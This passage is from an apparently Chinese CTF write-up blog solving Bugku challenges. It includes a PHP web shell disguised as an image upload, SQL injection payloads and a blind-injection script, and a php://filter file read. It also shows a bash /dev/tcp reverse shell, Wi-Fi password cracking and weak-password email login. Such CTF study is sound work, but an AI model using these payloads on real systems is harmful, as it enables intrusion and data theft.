class="keyword">in</span> dic:</span><br><span class="line">            <span class="keyword">for</span> p <span class="keyword">in</span> dic:</span><br><span class="line">                <span class="keyword">for</span> q <span class="keyword">in</span> dic:</span><br><span class="line">                    s = i + j + p + q</span><br><span class="line">                    <span class="keyword">if</span> crc == (binascii.crc32(s) &amp; <span class="number">0xffffffff</span>):</span><br><span class="line">                        f.write(s)</span><br><span class="line">                        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">CrackZip</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> I <span class="keyword">in</span> range(<span class="number">68</span>):</span><br><span class="line">        file = <span class="string">'123/out'</span> + str(I) + <span class="string">'.zip'</span></span><br><span class="line">        f = zipfile.ZipFile(file, <span class="string">'r'</span>)</span><br><span class="line">        GetCrc = f.getinfo(<span class="string">'data.txt'</span>)</span><br><span class="line">        crc = GetCrc.CRC</span><br><span class="line">        CrackCrc(crc)</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters + string.digits + <span class="string">'+/='</span></span><br><span class="line">f = open(<span class="string">'out.txt'</span>, <span class="string">'w'</span>)</span><br><span class="line">CrackZip()</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure><p>打开之后可以看到是一段base64，解码之后虽然部分是乱码，但是还可可以看到部分内容 <code>fix the file and get the flag</code> ，意思就是让我们修复这个文件，把解码后的内容导入到文件中，查看一下十六进制发现结尾是rar的文件尾部，推测这是RAR文件，则把文件头补齐一下，解压之后还是没有flag，于是再次查看压缩包，在注释里面找到了flag，（文件十六进制值里面有一个CMT字段，说明RAR文件存在注释）</p><h2 id="一个普通的压缩包-xp0intCTF"><a href="#一个普通的压缩包-xp0intCTF" class="headerlink" title="一个普通的压缩包(xp0intCTF)"></a>一个普通的压缩包(xp0intCTF)</h2><p>文件下载之后是个RAR文件，解压之后是个flag.txt，但是里面内容没有flag，所以重点应该还是在这个压缩包，网上看了别人的思路是修改了文件的十六进制值部分改为 <code>A8 3C 74</code> ，这样再次进行解压即可解压出一个png图片，但是查看十六进制值发现前缀是GIF前缀，修改后缀为GIF，在ps中有两个图层，再把这两个图层分别保存为gif文件，之后再用stegsolve查看即可看到二维码，分别保存，再在ps中上下拼接成二维码，坑点在于拼接之后的二维码还需要修复一下：将下面的图片下面的左半部分拼接左上角，另外还要讲左半部分的定位快在拼接到右上角的空块中。</p><h2 id="就五层你能解开吗"><a href="#就五层你能解开吗" class="headerlink" title="就五层你能解开吗"></a>就五层你能解开吗</h2><p>根据提示第一层是crc32碰撞，可以看到压缩包的3个txt文件都是6字节，所以猜测应该是用这三个TXT文件的crc32校验值来做。用github上的一个项目来做一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python crc32.py reverse 0x4dad5967</span><br></pre></td></tr></table></figure><p>得到</p><blockquote><p>4 bytes: {0x1b, 0xd6, 0x38, 0xc2}<br>verification checksum: 0x4dad5967 (OK)<br>alternative: 9rNYn3 (OK)<br>alternative: Ay8sZC (OK)<br>alternative: QHSaFX (OK)<br>alternative: TmQA5n (OK)<br>alternative: VQT_ls (OK)<br>alternative: X28BT9 (OK)<br>alternative: _GLQzV (OK)<br>alternative: goMEPt (OK)<br>alternative: nyUKFQ (OK)<br>alternative: t_s4f3 (OK)<br>alternative: xQxVkx (OK)<br>alternative: yQ9gpa (OK)</p></blockquote><p>把三个校验码都跑一下，然后提取其中相对有意义的结果拼起来可以得到解压密码 <code>_CRC32_i5_n0t_s4f3</code> ，第一层解开！</p><p>第二层是维吉尼亚密码，题目给出了近一万条密钥，直接暴力破解肯定是不可能的，但是我们发现密文第一个单词为 <code>rla</code> 只有三个字母，我们可以推测这三个字母的含义，我想了几个可能的情况</p><div class="table-container"><table><thead><tr><th style="text-align:center">明文</th><th style="text-align:center">密文</th><th style="text-align:center">密钥</th></tr></thead><tbody><tr><td style="text-align:center">the</td><td style="text-align:center">rla</td><td style="text-align:center">yew</td></tr><tr><td style="text-align:center">she</td><td style="text-align:center">rla</td><td style="text-align:center">zee</td></tr><tr><td style="text-align:center">you</td><td style="text-align:center">rla</td><td style="text-align:center">txq</td></tr><tr><td style="text-align:center">key</td><td style="text-align:center">rla</td><td style="text-align:center">hhc</td></tr></tbody></table></div><p>查表发现只有第一个可以找到对应密钥，尝试解密一下</p><blockquote><p>the vigenere cipher is a method of encrypting alphabetic text by using a series of different caesar ciphers based on the letters of a keyword it is a simple form of polyalphabetic substitution so password is vigenere cipher funny</p></blockquote><p>语义通顺，应该就是这个，用密钥尝试解压缩包，成功，第二层解开！</p><p>第三次sha1碰撞，继续上脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">keys = string.ascii_letters + string.digits + string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sha1</span><span class="params">(s)</span>:</span></span><br><span class="line">    sha1_hash = hashlib.sha1()</span><br><span class="line">    sha1_hash.update(s)</span><br><span class="line">    <span class="keyword">return</span> sha1_hash.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> keys:</span><br><span class="line"><span class="keyword">for</span> q <span class="keyword">in</span> keys:</span><br><span class="line">password = i + <span class="string">'7'</span> + j + <span class="string">'5-'</span> + p + <span class="string">'4'</span> + q + <span class="string">'3?'</span> </span><br><span class="line">sha = sha1(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line"><span class="keyword">if</span> sha[<span class="number">0</span>:<span class="number">7</span>] == <span class="string">'619c20c'</span> <span class="keyword">and</span> sha[<span class="number">8</span>] == <span class="string">'a'</span> <span class="keyword">and</span> sha[<span class="number">16</span>] == <span class="string">'9'</span>:</span><br><span class="line">print(password)</span><br></pre></td></tr></table></figure><p>得到密码 <code>I7~5-s4F3?</code> ，第三次解开！</p><p>第四层要求两个exe文件md5值相同但是输出不同，网上查找了一下还真的是有，一个文件输出 <code>Hello World ;-)</code> ,另一个输出 <code>Goodbye World :-(</code> ，以此为密码即可解开</p><p>第五层折腾了好久，RSA题目做的太少了，用openssl打开ssl文件看一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -in rsa_public_key.pem -text -modulus</span><br></pre></td></tr></table></figure><p>可以看到e很大，也就是指数很大，网上找了一下有个wienerattack攻击，用脚本跑一下可以得到d</p><blockquote><p>8264667972294275017293339772371783322168822149471976834221082393409363691895</p></blockquote><p>那么接下来就是生成私钥了，github上有个ctftool可以生成私钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -f PEM -o key.pem -n 46065780722597 -d 826466 -e 3546</span><br></pre></td></tr></table></figure><p>PS：篇幅所限，数字我都缩小了</p><p>然后利用生成的私钥解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsautl -decrypt -in flag.enc -inkey key.pem -out 1.txt</span><br></pre></td></tr></table></figure><p>然后即可得到flag。</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h2><p>这个题目有点难，找了半天的资料，刚开始什么也没有，查看元素发现有个 <code>upload.php</code>，打开发现只能上传图片，试了各种方法都没有用，最后百度了一下找到了方法，直接上传jpg文件，内容如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt; system($_REQUEST[a])&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>发现成功上传，传递参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=upload/201803160110346459.jpg&amp;a=ls</span><br></pre></td></tr></table></figure></p><p>有个txt文件，查看一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=upload/201803160110346459.jpg&amp;a=cat this_is_th3_F14g_154f65sd4g35f4d6f43.txt</span><br></pre></td></tr></table></figure></p><p>如此可得到flag</p><h2 id="flag-php"><a href="#flag-php" class="headerlink" title="flag.php"></a>flag.php</h2><p>点了确实没反应，看了提示是 <code>hint</code>，原来是要get一个hint参数为1， <code>?hint=1</code>，即可得到源代码，审计一下，只要使cookie中的ISecer的反序列化值与<strong><font face="futura">$EKY</font></strong>的反序列化全等即可。但要注意的是$KEY在序列化之前，即<code>$KEY=’’</code>，序列化为 <code>s:0:””</code></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>题目主要过滤了空格，可以用 <code>/**/</code>绕过，这里介绍个 <font face="futura">load_file(filename)</font>可以查看文件，然后慢慢截取即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1/**/and/**/updatexml(1,concat(0x7e,(concat(substr(load_file(0x2F7661722F746573742F6B65795F312E706870),100,30))),0x7e),1)</span><br></pre></td></tr></table></figure><p>但是有一个地方贼坑，就是提交flag时的引号，一定要用题目里面要求的引号，不是英文的引号！！！</p><h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><p>发现文件泄露，访问flag即可(贼几把坑)</p><h2 id="文件上传2-湖湘杯"><a href="#文件上传2-湖湘杯" class="headerlink" title="文件上传2(湖湘杯)"></a>文件上传2(湖湘杯)</h2><p>这道题目没做出来，每次做文件上传类题目的时候总是没思路，这次看了别人的思路，直接文件读取居然就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.24.86.145:9011/?op=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure><h2 id="孙xx的博客"><a href="#孙xx的博客" class="headerlink" title="孙xx的博客"></a>孙xx的博客</h2><p>扫描旁站发现一个PHPmyadmin，查看博客内容</p><blockquote><p>MySQL数据库用户名<br>define(‘DB_USER’, ‘wp’);</p></blockquote><p> MySQL数据库密码<br>define(‘DB_PASSWORD’, ‘wzTrzYRdbrbyjAx’); </p><p>登录即可找到flag</p><h2 id="login-SKCTF"><a href="#login-SKCTF" class="headerlink" title="login(SKCTF)"></a>login(SKCTF)</h2><p>题目提示是SQL布尔盲注，username字段过滤了空格等常用字符，还有逻辑符号等，新学到一个<strong><font face="futura">mid()</font></strong>函数，可以绕过for和逗号</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=admin&apos;^(ascii(mid((password)from(1)))&lt;&gt;55)^0#&amp;password=123</span><br></pre></td></tr></table></figure><p>直接上脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.219.210:49167/"</span></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:payload,<span class="string">'password'</span>:<span class="string">'123'</span>&#125;</span><br><span class="line">flag_yes = <span class="string">'error'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">start = <span class="number">1</span></span><br><span class="line">end_signal = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">while</span>(end_signal):</span><br><span class="line">end_signal = <span class="keyword">False</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">payload = <span class="string">"admin'^(ascii(mid((password)from(&#123;&#125;)))&lt;&gt;&#123;&#125;)^0#"</span>.format(str(start),str(j))</span><br><span class="line">data[<span class="string">'username'</span>] = payload</span><br><span class="line">res = requests.post(url,data=data).text</span><br><span class="line"><span class="keyword">if</span> flag_yes <span class="keyword">in</span> res:</span><br><span class="line">flag += chr(j)</span><br><span class="line">print(flag)</span><br><span class="line">start += <span class="number">1</span></span><br><span class="line">end_signal = <span class="keyword">True</span></span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><strong>注意：</strong>解出后的密码要md5解密，怪我太年轻。</p><h2 id="PHP-encrypt-1-ISCCCTF"><a href="#PHP-encrypt-1-ISCCCTF" class="headerlink" title="PHP_encrypt_1(ISCCCTF)"></a>PHP_encrypt_1(ISCCCTF)</h2><p>这个题目应该是有漏掉东西，没有给出加密后的密文，网上找一下密文，反向破解即可，贴上代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">cipher = <span class="string">'fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA='</span>  <span class="comment"># 题目中应该给出的密文串</span></span><br><span class="line"></span><br><span class="line">plain = base64.b64decode(cipher)</span><br><span class="line">plain = plain.decode(<span class="string">'unicode-escape'</span>)</span><br><span class="line">plain1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造题目中的md5串</span></span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(<span class="string">b'ISCC'</span>)</span><br><span class="line">key = m.hexdigest()</span><br><span class="line">char = <span class="string">''</span></span><br><span class="line">x = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(cipher)):</span><br><span class="line"><span class="keyword">if</span> x == len(key):</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">char += key[x]</span><br><span class="line">x += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">numflag = []    <span class="comment"># 明文ascii码值</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Is_OK</span><span class="params">(number)</span>:</span></span><br><span class="line"><span class="keyword">if</span> number &gt;= <span class="number">33</span> <span class="keyword">and</span> number &lt; <span class="number">127</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(plain)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">tmp = <span class="number">128</span> * j + ord(plain[i]) - ord(char[i])</span><br><span class="line"><span class="keyword">if</span> Is_OK(tmp):</span><br><span class="line">numflag.append(tmp)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> numflag:</span><br><span class="line">print(chr(i),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></p><h2 id="login2-SKCTF"><a href="#login2-SKCTF" class="headerlink" title="login2(SKCTF)"></a>login2(SKCTF)</h2><p>这题纯学习姿势，先正常发送请求，抓包发现提示是 <code>tips</code>，base64解码，是一段php代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT username,password FROM admin WHERE username='"</span>.$username.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($row) &amp;&amp; $row[<span class="string">'password'</span>]===md5($password))&#123;&#125;</span><br></pre></td></tr></table></figure></p><p>题目也提示了union绕过，payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; union select md5(1),md5(1)#&amp;password=1</span><br></pre></td></tr></table></figure><p>如此即可绕过，登录后是个命令执行，接下来开始重要姿势！！！！</p><p><strong>反弹shell</strong></p><p>你的linux主机上监听一下端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvv 8888</span><br></pre></td></tr></table></figure><p>然后执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|bash -i &gt;&amp; /dev/tcp/你的ip地址/8888 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p>如此即可成功反弹到shell!!!!(233333)</p><p>然后读文件即可</p><p><img src="/2018/04/03/bugku-writeup续/1.png" alt=""></p><h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><h2 id="md5加密相等绕过"><a href="#md5加密相等绕过" class="headerlink" title="md5加密相等绕过"></a>md5加密相等绕过</h2><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=240610708</span><br></pre></td></tr></table></figure></p><h2 id="ereg正则-00截断"><a href="#ereg正则-00截断" class="headerlink" title="ereg正则%00截断"></a>ereg正则%00截断</h2><p>好坑啊，提交了一个 <code>?password=9e9%00-</code>老是不对，没想到居然是 <code>?password=9e9%00*-*</code>,哎，扎心了…</p><h2 id="extract变量覆盖"><a href="#extract变量覆盖" class="headerlink" title="extract变量覆盖"></a>extract变量覆盖</h2><p>比较简单，payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?shiyan=flag&amp;flag=php://input</span><br><span class="line">flag</span><br></pre></td></tr></table></figure></p><p>第二行以post方式提交</p><h2 id="urldecode二次编码饶过"><a href="#urldecode二次编码饶过" class="headerlink" title="urldecode二次编码饶过"></a>urldecode二次编码饶过</h2><p>题目关键点在于，<strong><font face="futura">$_GET[]</font></strong>会先对得到的参数进行一次url解码，然后在函数中又进行了一次解码，所以会产生二次编码漏洞。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%2568%2561%2563%256B%2565%2572%2544%254A</span><br></pre></td></tr></table></figure></p><p>二次编码后提交即可。</p><h2 id="md5函数"><a href="#md5函数" class="headerlink" title="md5函数"></a>md5函数</h2><p>直接提交数组即可</p><h2 id="sha函数比较绕过"><a href="#sha函数比较绕过" class="headerlink" title="sha函数比较绕过"></a>sha函数比较绕过</h2><p>还是提交数组即可</p><h2 id="十六进制与数字比较"><a href="#十六进制与数字比较" class="headerlink" title="十六进制与数字比较"></a>十六进制与数字比较</h2><p>直接提交16进制数字即可。</p><h2 id="strpos数组绕过"><a href="#strpos数组绕过" class="headerlink" title="strpos数组绕过"></a>strpos数组绕过</h2><p>还是数字绕过 <code>?ctf[]=1234</code></p><h1 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h1><h2 id="眼见非实-ISCCCTF"><a href="#眼见非实-ISCCCTF" class="headerlink" title="眼见非实(ISCCCTF)"></a>眼见非实(ISCCCTF)</h2><p>看到文件名是个zip，改后缀名为zip打开，解压后发现是个doc文件，但是带不开，看一下16进制发现 <code>504b0304</code>的开头，所以应该是一个zip文件，在改后缀为zip解压，找出flag即可。</p><h2 id="又一张图片，还单纯吗"><a href="#又一张图片，还单纯吗" class="headerlink" title="又一张图片，还单纯吗"></a>又一张图片，还单纯吗</h2><p>binwalk跑一下发现有两个图片，切一下即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">falg&#123;NSCTF_e6532a34928a3d1dadd0b049d5a3cc57&#125;</span><br></pre></td></tr></table></figure></p><h2 id="宽带信息泄露"><a href="#宽带信息泄露" class="headerlink" title="宽带信息泄露"></a>宽带信息泄露</h2><p>百度可知bin后缀为路由器备份文件，有routepassview打开找username字段即可。</p><h2 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h2><p>binwalk跑一下即可，之后得到一个压缩包，需要密码，但是密码只有三位数，暴力破解即可密码871，然后16进制打开，在末尾即可得到flag，花括号内还要base64解码，注意吧flag的@换成a，这是一个坑。</p><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><p>直接解压，然后有个flag文件，hex里面找一下key即可。</p><h2 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h2><p>下载后是个数据流文件，wireshark查看一下，由于是菜刀连接，所以只需要查看http协议即可，在第四个http协议里面发现了一句话木马，所以猜测数据传输应该在这之后，追踪一下http流，发现一段base64代码，解之<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>,<span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(PHP_VERSION&lt;<span class="string">'5.3.0'</span>)&#123;</span><br><span class="line">@set_magic_quotes_runtime0);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">"X@Y"</span>);</span><br><span class="line">$F=<span class="string">'C:\\wwwroot\\3.php'</span>;</span><br><span class="line">$P=@fopen($F,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span>(@fread($P,filesize($F)));</span><br><span class="line">@fclose($P);;<span class="keyword">echo</span>(<span class="string">"X@Y"</span>);<span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></p><p>这应该是打开某个文件，开头和末尾都是 <code>X@Y</code>,查看下一个http流</p><p><img src="/2018/04/03/bugku-writeup续/2.png" alt=""></p><p>这应该就是传输的文件，查看一下分组字节，然后把前后的X@Y去掉，解码为压缩形式即可得到flag</p><h2 id="这么多数据包"><a href="#这么多数据包" class="headerlink" title="这么多数据包"></a>这么多数据包</h2><p>这个题不是很理解，数据流审计还很菜，这里记录一下别人的解法，观察tcp可以看出从104个包开始攻击机开始扫描目标机，在以5542开始的包就已经getshell，所以追踪一下tcp流，发现有个txt文件，有一段base64，解码即可得到flag、</p><h2 id="隐写3"><a href="#隐写3" class="headerlink" title="隐写3"></a>隐写3</h2><p>改变图片高度即可</p><h2 id="想蹭网先解开密码"><a href="#想蹭网先解开密码" class="headerlink" title="想蹭网先解开密码"></a>想蹭网先解开密码</h2><p>这个题不是很理解工具怎么使用，WiFi不是很了解，写一个字典出来，工具跑一下，命令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi.cap -w passwd.txt</span><br></pre></td></tr></table></figure><p><img src="/2018/04/03/bugku-writeup续/3.png" alt=""></p><h2 id="linux2"><a href="#linux2" class="headerlink" title="linux2"></a>linux2</h2><p>下载文件，先是binwalk了一下，发现一个图片，还有一个图片，图片是一个flag内容，然而并不对，看了比人的wp才知道了正解，没必要binwalk直接跑一下命令即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings brave &gt; a.txt</span><br></pre></td></tr></table></figure><p>然后在a.txt中搜索一下 <code>key</code>，直接出现了flag</p><h2 id="账号被盗了-1"><a href="#账号被盗了-1" class="headerlink" title="账号被盗了"></a>账号被盗了</h2><p>这题不会…</p><h2 id="聪明的大象"><a href="#聪明的大象" class="headerlink" title="聪明的大象"></a>聪明的大象</h2><p>解压图片发现备注栏有一段base64，再看图片大小6M多，应该是加了东西，binwalk跑一下，切出来一个解压包，密码就是刚刚的base64，解之是一张图片，是以前的一道题，改变高度即可得到flag</p><h1 id="web进阶"><a href="#web进阶" class="headerlink" title="web进阶"></a>web进阶</h1><h2 id="实战2-注入"><a href="#实战2-注入" class="headerlink" title="实战2-注入"></a>实战2-注入</h2><p>打开后发现news页面有id参数，加引号可以报错注入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=18 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 21,1),0x7e),1)</span><br></pre></td></tr></table></figure></p><h2 id="Trim的日记本"><a href="#Trim的日记本" class="headerlink" title="Trim的日记本"></a>Trim的日记本</h2><p>扫描目录，发现有一个 <code>show.php</code>进入即可得到flag！！！！不过不知道是不是正解。</p><h1 id="社工"><a href="#社工" class="headerlink" title="社工"></a>社工</h1><h2 id="社工进阶"><a href="#社工进阶" class="headerlink" title="社工进阶"></a>社工进阶</h2><p>百度搜索孤长离发现有个贴吧，里面有个邮箱，尝试弱口令登录，百度top100弱口令，第二个就是了 <code>a123456</code></p><h2 id="信息查找"><a href="#信息查找" class="headerlink" title="信息查找"></a>信息查找</h2><p>直接百度 <code>bugku.cn 今日头条</code>，第一个结果的群号即可。</p><h2 id="简单个人信息收集"><a href="#简单个人信息收集" class="headerlink" title="简单个人信息收集"></a>简单个人信息收集</h2><p>首先下载到一个压缩包，发现是伪加密，破解之，然后在上社工库查询一下即可。</p><h2 id="简单的社工尝试"><a href="#简单的社工尝试" class="headerlink" title="简单的社工尝试"></a>简单的社工尝试</h2><p>google识图，然后有一个github相关的页面，点进去之后有一个微博链接，进去之后有个图片，打开图片中的链接即可。</p><h1 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h1><h2 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h2><p>凯撒移位，代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">'e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">-70</span>,<span class="number">32</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> cipher:</span><br><span class="line"><span class="comment"># print(ord(j)+i)</span></span><br><span class="line"><span class="keyword">if</span> (ord(j)+i) &gt; <span class="number">132</span> <span class="keyword">or</span> (ord(j)+i) &lt; <span class="number">33</span>:</span><br><span class="line"><span class="keyword">break</span> </span><br><span class="line">print(chr(ord(j)+i),end=<span class="string">""</span>)</span><br><span class="line">print(<span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure><h2 id="一段base64"><a href="#一段base64" class="headerlink" title="一段base64"></a>一段base64</h2><p>多层解码，贴上代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 